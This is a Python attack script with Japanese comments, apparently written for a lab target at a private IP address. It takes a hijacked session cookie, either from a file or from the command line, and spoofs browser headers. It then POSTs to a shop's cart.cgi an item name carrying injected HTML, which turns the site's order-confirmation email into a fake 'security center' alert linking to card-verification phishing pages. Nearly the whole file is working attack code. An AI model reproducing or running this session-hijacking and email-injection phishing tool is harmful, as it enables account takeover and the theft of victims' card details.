#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
自動化攻撃スクリプト: buyproduct.py
他人のセッションを使用してcart.cgiに悪意のあるデータをPOSTし、
フィッシングメールを送信させる攻撃

使用方法:
1. 被害者のセッションIDを取得
2. スクリプトを実行して攻撃メールを送信
"""

import requests
import urllib.parse
import sys
import time
import os
from typing import Dict, List, Optional

class CartAttacker:
    def __init__(self, base_url: str = "http://192.168.49.128/hack/public"):
        """
        攻撃クラスの初期化
        
        Args:
            base_url: ターゲットサイトのベースURL
        """
        self.base_url = base_url.rstrip('/')
        self.cart_url = f"{self.base_url}/cart.cgi"
        self.session = requests.Session()
        
        # User-Agentを偽装
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ja,en-US;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

    def create_phishing_payload(self) -> Dict[str, str]:
        """
        フィッシング攻撃用のpayloadを作成
        
        Returns:
            POSTデータの辞書
        """
        
        # 統一された攻撃パターン
        malicious_name = """正常商品
</pre>
<div style='background:#000080;color:#ffffff;padding:25px;border:3px solid #ffff00;margin:20px 0;text-align:center;font-family:Arial;'>
<h2 style='color:#ffff00;margin:0;'>🛡️ セキュリティセンター緊急通知</h2>
<hr style='border:1px solid #ffff00;margin:15px 0;'>
<p style='font-size:16px;line-height:1.5;'>
あなたのアカウントで異常なアクセスが検知されました。<br>
<strong style='color:#ff6666;'>クレジットカード情報が第三者に漏洩</strong>している可能性があります。
</p>
<div style='background:#ff0000;padding:15px;margin:15px 0;border-radius:5px;'>
<strong>緊急対応が必要です</strong><br>
被害拡大防止のため、以下の手順を今すぐ実行してください：
</div>
<a href='https://security-support-center.fake.com/urgent' style='background:#00ff00;color:#000;padding:15px 30px;text-decoration:none;border-radius:5px;font-weight:bold;display:inline-block;margin:10px;border:3px solid #fff;'>
📞 緊急サポートセンター
</a><br>
<a href='https://card-security-check.fake.com/verify' style='background:#ffff00;color:#000;padding:15px 30px;text-decoration:none;border-radius:5px;font-weight:bold;display:inline-block;margin:10px;border:3px solid #fff;'>
🔐 カード情報再確認
</a><br>
<small style='color:#cccccc;'>受付時間: 24時間365日対応</small>
</div>
<pre style='display:none;'>"""
        
        # POSTデータを構築
        payload = {
            'action': 'confirm_purchase',
            'item_price': '0.01',
            'item_name': malicious_name,
            'item_id': '1',
            'email': 'c0a2302749@edu.teu.ac.jp'  # ターゲットのメールアドレス
        }
        
        return payload

    def load_hijacked_session(self, session_file: str = "hijacked_session.txt") -> Optional[str]:
        """
        hijacked_session.txtからセッションIDを読み込み
        
        Args:
            session_file: セッションファイルのパス
            
        Returns:
            セッションID（見つからない場合はNone）
        """
        try:
            # スクリプトと同じディレクトリのセッションファイルを確認
            script_dir = os.path.dirname(os.path.abspath(__file__))
            session_path = os.path.join(script_dir, session_file)
            
            if not os.path.exists(session_path):
                print(f"[-] セッションファイルが見つかりません: {session_path}")
                return None
            
            with open(session_path, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                
            # ファイル形式: username,session_id
            if ',' in content:
                username, session_id = content.split(',', 1)
                print(f"[+] セッションファイルから読み込み: {username} -> {session_id}")
                return session_id.strip()
            else:
                # セッションIDのみの場合
                print(f"[+] セッションIDを読み込み: {content}")
                return content
                
        except Exception as e:
            print(f"[-] セッションファイル読み込みエラー: {e}")
            return None

    def set_session_cookies(self, session_data: str):
        """
        盗取したセッション情報をセット（message.pyと同じ方式）
        
        Args:
            session_data: "user_id,session_id" 形式のセッションデータ
        """
        try:
            user_id, session_token = session_data.split(',', 1)
            self.session.cookies.set('user_id', user_id.strip())
            self.session.cookies.set('session_id', session_token.strip())
            print(f"[+] セッション情報設定完了: user_id={user_id}, session_id={session_token}")
        except ValueError:
            print(f"[-] セッションデータの形式が不正です: {session_data}")
            raise

    def execute_attack(self, session_data: str, target_email: str = None) -> bool:
        """
        攻撃を実行
        
        Args:
            session_data: "user_id,session_id" 形式のセッションデータ
            target_email: ターゲットのメールアドレス
            
        Returns:
            攻撃成功の可否
        """
        
        print(f"[*] 攻撃開始")
        print(f"[*] ターゲットURL: {self.cart_url}")
        
        # セッション情報をセット
        self.set_session_cookies(session_data)
        
        # payloadを作成
        payload = self.create_phishing_payload()
        
        # ターゲットメールが指定されていれば更新
        if target_email:
            payload['email'] = target_email
            
        print(f"[*] ターゲットメール: {payload['email']}")
        
        try:
            # POSTリクエストを送信（message.pyと同じヘッダー形式）
            print("[*] POSTリクエスト送信中...")
            
            # より詳細なヘッダーを設定
            user_id, session_token = session_data.split(',', 1)
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': f'user_id={user_id.strip()}; session_id={session_token.strip()}',
                'Host': '192.168.49.128',
                'Origin': self.base_url,
                'Referer': f'{self.base_url}/cart.cgi',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
            }
            
            response = self.session.post(
                self.cart_url,
                data=payload,
                headers=headers,
                timeout=30,
                allow_redirects=False
            )
            
            print(f"[*] レスポンスステータス: {response.status_code}")
            print(f"[*] レスポンスヘッダー: {dict(response.headers)}")
            
            if response.status_code == 200:
                print("[+] 攻撃成功！フィッシングメールが送信されました")
                
                # レスポンス内容をチェック
                if "取引完了" in response.text:
                    print("[+] 購入処理が正常に完了しました")
                    return True
                elif "Terminal X - Login" in response.text:
                    print("[-] セッションが無効です（ログインページにリダイレクト）")
                    return False
                else:
                    print("[-] 購入処理でエラーが発生した可能性があります")
                    print(f"[*] レスポンス内容（最初の500文字）:")
                    print(response.text[:500])
                    
            elif response.status_code == 302:
                print("[-] リダイレクトが発生しました（認証失敗の可能性）")
                print(f"[*] Location: {response.headers.get('Location', 'N/A')}")
                
            else:
                print(f"[-] 予期しないステータスコード: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[-] リクエストエラー: {e}")
            return False
            
        return False

    def test_session_validity(self, session_data: str) -> bool:
        """
        セッション情報の有効性をテスト
        
        Args:
            session_data: "user_id,session_id" 形式のセッションデータ
            
        Returns:
            セッションの有効性
        """
        print("[*] セッション有効性テスト中...")
        
        try:
            user_id, session_token = session_data.split(',', 1)
            
            # message.pyと同じヘッダー形式でGETリクエスト
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Cookie': f'user_id={user_id.strip()}; session_id={session_token.strip()}',
                'Host': '192.168.49.128',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
            }
            
            # カートページにアクセス
            response = self.session.get(self.cart_url, headers=headers, timeout=10)
            
            if "Terminal X - Login" in response.text:
                print("[-] セッションが無効です（ログインページにリダイレクト）")
                return False
            elif "TRANSACTION_EXECUTION" in response.text:
                print("[+] セッションは有効です")
                return True
            else:
                print("[?] セッション状態が不明ですが、継続します")
                print(f"[*] レスポンス内容（最初の200文字）:")
                print(response.text[:200])
                return True
                
        except ValueError:
            print(f"[-] セッションデータの形式が不正です: {session_data}")
            return False
        except requests.exceptions.RequestException as e:
            print(f"[-] テストエラー: {e}")
            return False

def print_usage():
    """使用方法を表示"""
    print("""
=== Cart Attack Tool ===

使用方法:
    python3 buyproduct.py [session_data] [options]

引数:
    session_data     "user_id,session_id" 形式のセッションデータ（省略時はhijacked_session.txtから自動読み込み）

オプション:
    --email          ターゲットメールアドレス
    --url            ターゲットサイトのURL
    --session-file   セッションファイルのパス (デフォルト: hijacked_session.txt)

例:
    python3 buyproduct.py                                         # セッションファイルから自動読み込み
    python3 buyproduct.py "mmm,abc123session"                     # 直接セッションデータ指定
    python3 buyproduct.py --email target@example.com              # カスタムメールアドレス指定
    """)

def load_session_from_file_or_arg(args: List[str]) -> Optional[str]:
    """
    引数またはファイルからセッションデータを取得
    
    Args:
        args: コマンドライン引数
        
    Returns:
        "user_id,session_id" 形式のセッションデータ
    """
    # まず引数でセッションデータが直接指定されているかチェック
    if len(args) > 1 and not args[1].startswith('--'):
        session_data = args[1]
        # セッションデータの形式チェック
        if ',' in session_data:
            return session_data
        else:
            print(f"[-] セッションデータは 'user_id,session_id' 形式で指定してください")
            return None
    
    # セッションファイルから読み込み
    script_dir = os.path.dirname(os.path.abspath(__file__))
    session_file = "hijacked_session.txt"
    
    # --session-fileオプションをチェック
    for i, arg in enumerate(args):
        if arg == "--session-file" and i + 1 < len(args):
            session_file = args[i + 1]
            break
    
    session_path = os.path.join(script_dir, session_file)
    
    try:
        if not os.path.exists(session_path):
            print(f"[-] セッションファイルが見つかりません: {session_path}")
            return None
        
        with open(session_path, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            
        # ファイル形式: user_id,session_id
        if ',' in content:
            user_id, session_id = content.split(',', 1)
            print(f"[+] セッションファイルから読み込み: {user_id} -> {session_id}")
            return content
        else:
            print(f"[-] セッションファイルの形式が不正です。'user_id,session_id' 形式で記述してください")
            return None
            
    except Exception as e:
        print(f"[-] セッションファイル読み込みエラー: {e}")
        return None

def main():
    """メイン関数"""
    
    # セッションデータを引数またはファイルから取得
    session_data = load_session_from_file_or_arg(sys.argv)
    
    if not session_data:
        print("[-] セッションデータが見つかりません")
        print_usage()
        sys.exit(1)
    
    # オプション解析
    target_email = None
    base_url = "http://192.168.49.128/hack/public"
    
    i = 1
    # 最初の引数がセッションデータでない場合（ファイルから読み込んだ場合）
    if len(sys.argv) > 1 and sys.argv[1].startswith('--'):
        i = 1
    else:
        i = 2  # 最初の引数がセッションデータの場合
    
    while i < len(sys.argv):
        if sys.argv[i] == "--email" and i + 1 < len(sys.argv):
            target_email = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--url" and i + 1 < len(sys.argv):
            base_url = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--session-file" and i + 1 < len(sys.argv):
            # セッションファイルは既に処理済み
            i += 2
        else:
            print(f"不明なオプション: {sys.argv[i]}")
            i += 1
    
    # 攻撃インスタンスを作成
    attacker = CartAttacker(base_url)
    
    print("=== Cart Phishing Attack Tool ===")
    print(f"[*] セッションデータ: {session_data}")
    print(f"[*] ベースURL: {base_url}")
    if target_email:
        print(f"[*] カスタムメール: {target_email}")
    

    success = attacker.execute_attack(session_data, target_email)
        
    if success:
        print("\n[+] 攻撃が正常に完了しました")
        print("[+] ターゲットにフィッシングメールが送信されました")
    else:
        print("\n[-] 攻撃に失敗しました")


if __name__ == "__main__":
    main()
